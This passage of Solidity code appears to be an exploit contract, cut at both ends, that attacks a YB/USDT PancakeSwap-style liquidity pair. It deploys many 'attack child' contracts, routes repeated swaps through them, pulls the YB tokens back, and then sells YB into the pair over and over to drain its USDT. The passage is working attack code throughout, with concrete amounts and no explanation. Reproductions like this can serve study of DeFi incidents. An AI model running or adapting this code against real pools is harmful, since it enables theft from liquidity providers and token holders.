        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2457579067267307186, 0, Addresses.attack_child_2156, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_2156);
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_2156, address(this), 2334700113903941827);
        {
            address created = Addresses.attack_child_8793;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_8793)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2400289346586368983, 0, Addresses.attack_child_8793, hex"");
        _pullChildYb(Addresses.attack_child_8793);
        {
            address created = Addresses.attack_child_87C1;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_87C1)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2344980602339818800, 0, Addresses.attack_child_87C1, hex"");
        _pullChildYb(Addresses.attack_child_87C1);
        {
            address created = Addresses.attack_child_79BC;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_79BC)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback13() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2291562525745534876, 0, Addresses.attack_child_79BC, hex"");
        _pullChildYb(Addresses.attack_child_79BC);
        {
            address created = Addresses.attack_child_691D;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_691D)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2239949896878652376, 0, Addresses.attack_child_691D, hex"");
        _pullChildYb(Addresses.attack_child_691D);
        {
            address created = Addresses.attack_child_6767;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_6767)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2190062244374264473, 0, Addresses.attack_child_6767, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_6767);
    }

    function flashCallback14() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_6767, address(this), 2080559132155551250);
        {
            address created = Addresses.attack_child_C8EF;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_C8EF)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2141823531387653710, 0, Addresses.attack_child_C8EF, hex"");
        _pullChildYb(Addresses.attack_child_C8EF);
        {
            address created = Addresses.attack_child_C9E0;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_C9E0)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2095161865521724564, 0, Addresses.attack_child_C9E0, hex"");
        _pullChildYb(Addresses.attack_child_C9E0);
        {
            address created = Addresses.attack_child;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback15() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(2050009230653638322, 0, Addresses.attack_child, hex"");
        _pullChildYb(Addresses.attack_child);
        {
            address created = Addresses.attack_child_B367;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_B367)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(2006301238791256492, 0, Addresses.attack_child_B367, hex"");
        _pullChildYb(Addresses.attack_child_B367);
        {
            address created = Addresses.attack_child_36D4;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_36D4)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1963976900267634512, 0, Addresses.attack_child_36D4, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_36D4);
    }

    function flashCallback16() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_36D4, address(this), 1865778055254252787);
        {
            address created = Addresses.attack_child_E854;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_E854)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1922978410740883616, 0, Addresses.attack_child_E854, hex"");
        _pullChildYb(Addresses.attack_child_E854);
        {
            address created = Addresses.attack_child_ED2C;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_ED2C)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1883250953609346275, 0, Addresses.attack_child_ED2C, hex"");
        _pullChildYb(Addresses.attack_child_ED2C);
        {
            address created = Addresses.attack_child_38C7;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_38C7)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback17() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1844742516580061477, 0, Addresses.attack_child_38C7, hex"");
        _pullChildYb(Addresses.attack_child_38C7);
        {
            address created = Addresses.attack_child_1A2A;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_1A2A)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1807403721243556875, 0, Addresses.attack_child_1A2A, hex"");
        _pullChildYb(Addresses.attack_child_1A2A);
        {
            address created = Addresses.attack_child_5D54;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_5D54)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1771187664611526252, 0, Addresses.attack_child_5D54, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_5D54);
    }

    function flashCallback18() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_5D54, address(this), 1682628281380949940);
        {
            address created = Addresses.attack_child_3A78;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_3A78)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1736049771667193409, 0, Addresses.attack_child_3A78, hex"");
        _pullChildYb(Addresses.attack_child_3A78);
        {
            address created = Addresses.attack_child_59F6;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_59F6)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1701947658062238871, 0, Addresses.attack_child_59F6, hex"");
        _pullChildYb(Addresses.attack_child_59F6);
        {
            address created = Addresses.attack_child_461E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_461E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback19() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1668841002170055772, 0, Addresses.attack_child_461E, hex"");
        _pullChildYb(Addresses.attack_child_461E);
        {
            address created = Addresses.attack_child_030D;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_030D)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1636691425773673893, 0, Addresses.attack_child_030D, hex"");
        _pullChildYb(Addresses.attack_child_030D);
        {
            address created = Addresses.attack_child_C6DD;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_C6DD)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1605462382728714890, 0, Addresses.attack_child_C6DD, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_C6DD);
    }

    function flashCallback20() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_C6DD, address(this), 1525189263592279146);
        {
            address created = Addresses.attack_child_125F;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_125F)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1575119054997898665, 0, Addresses.attack_child_125F, hex"");
        _pullChildYb(Addresses.attack_child_125F);
        {
            address created = Addresses.attack_child_FC22;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_FC22)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1545628255504515331, 0, Addresses.attack_child_FC22, hex"");
        _pullChildYb(Addresses.attack_child_FC22);
        {
            address created = Addresses.attack_child_B752;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_B752)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback21() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1516958337298446862, 0, Addresses.attack_child_B752, hex"");
        _pullChildYb(Addresses.attack_child_B752);
        {
            address created = Addresses.attack_child_C701;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_C701)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1489079108570245193, 0, Addresses.attack_child_C701, hex"");
        _pullChildYb(Addresses.attack_child_C701);
        {
            address created = Addresses.attack_child_71EF;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_71EF)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1461961753086875237, 0, Addresses.attack_child_71EF, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_71EF);
    }

    function flashCallback22() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_71EF, address(this), 1388863665432531476);
        {
            address created = Addresses.attack_child_9F3F;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_9F3F)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1435578755657391538, 0, Addresses.attack_child_9F3F, hex"");
        _pullChildYb(Addresses.attack_child_9F3F);
        {
            address created = Addresses.attack_child_AA0C;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_AA0C)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1409903832268374976, 0, Addresses.attack_child_AA0C, hex"");
        _pullChildYb(Addresses.attack_child_AA0C);
        {
            address created = Addresses.attack_child_9F0D;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_9F0D)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback23() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1384911864557713892, 0, Addresses.attack_child_9F0D, hex"");
        _pullChildYb(Addresses.attack_child_9F0D);
        {
            address created = Addresses.attack_child_E2AC;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_E2AC)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1360578838321543035, 0, Addresses.attack_child_E2AC, hex"");
        _pullChildYb(Addresses.attack_child_E2AC);
        {
            address created = Addresses.attack_child_20CA;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_20CA)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1336881785773096292, 0, Addresses.attack_child_20CA, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_20CA);
    }

    function flashCallback24() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_20CA, address(this), 1270037696484441478);
        {
            address created = Addresses.attack_child_A69D;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_A69D)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1313798731294102717, 0, Addresses.attack_child_A69D, hex"");
        _pullChildYb(Addresses.attack_child_A69D);
        {
            address created = Addresses.attack_child_B529;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_B529)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1291308640439354795, 0, Addresses.attack_child_B529, hex"");
        _pullChildYb(Addresses.attack_child_B529);
        {
            address created = Addresses.attack_child_4632;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_4632)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback25() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1269391371973378396, 0, Addresses.attack_child_4632, hex"");
        _pullChildYb(Addresses.attack_child_4632);
        {
            address created = Addresses.attack_child_D42E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_D42E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1248027632734892854, 0, Addresses.attack_child_D42E, hex"");
        _pullChildYb(Addresses.attack_child_D42E);
        {
            address created = Addresses.attack_child_3D7E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_3D7E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1227198935140108715, 0, Addresses.attack_child_3D7E, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_3D7E);
    }

    function flashCallback26() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_3D7E, address(this), 1165838988383103280);
        {
            address created = Addresses.attack_child_79D7;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_79D7)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1206887557149997479, 0, Addresses.attack_child_79D7, hex"");
        _pullChildYb(Addresses.attack_child_79D7);
        {
            address created = Addresses.attack_child_31E3;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_31E3)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1187076504539597129, 0, Addresses.attack_child_31E3, hex"");
        _pullChildYb(Addresses.attack_child_31E3);
        {
            address created = Addresses.attack_child_5D8E;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_5D8E)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
    }

    function flashCallback27() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1167749475319293113, 0, Addresses.attack_child_5D8E, hex"");
        _pullChildYb(Addresses.attack_child_5D8E);
        {
            address created = Addresses.attack_child_265C;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_265C)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1148890826168930389, 0, Addresses.attack_child_265C, hex"");
        _pullChildYb(Addresses.attack_child_265C);
        {
            address created = Addresses.attack_child_1B19;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_1B19)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1130485540755652867, 0, Addresses.attack_child_1B19, hex"");
        IERC20Like(Addresses.YB).balanceOf(Addresses.attack_child_1B19);
    }

    function flashCallback28() internal {
        IERC20Like(Addresses.YB).transferFrom(Addresses.attack_child_1B19, address(this), 1073961263717870224);
        {
            address created = Addresses.attack_child_5A7A;
            require(created.code.length != 0, "attack child runtime missing");
        }
        AttackChild(payable(Addresses.attack_child_5A7A)).approveYbForAttack();
        {
            uint256 usdtToPair = 290909090909090909090;
            IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_350A, usdtToPair);
        }
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A)
            .swap(1112519199815608633, 0, Addresses.attack_child_5A7A, hex"");
        _pullChildYb(Addresses.attack_child_5A7A);
        IERC20Like(Addresses.YB).balanceOf(address(this));
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 559828097805770347498, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback29() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 561738415068385380592, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 563658338889235724709, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 565587928836973059397, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 567527244880684270660, address(this), hex"");
    }

    function flashCallback30() internal {
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 569476347392250801828, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 571435297148708528178, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 573404155334607724713, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
    }

    function flashCallback31() internal {
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 575382983544372683109, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 577371843784660520205, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 579370798476718706361, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
    }

    function flashCallback32() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 581379910458740827732, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 583399242988220081740, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 585428859744299990084, address(this), hex"");
        {
            uint256 ybToPair = 2205546571393244265;
            IERC20Like(Addresses.YB).transfer(Addresses.Cake_LP_350A, ybToPair);
        }
        IERC20Like(Addresses.YB).balanceOf(Addresses.Cake_LP_350A);
        IUniswapV2PairLike(Addresses.Cake_LP_350A).swap(0, 587468824830121798151, address(this), hex"");
    }

    function flashCallback33() internal {
        {
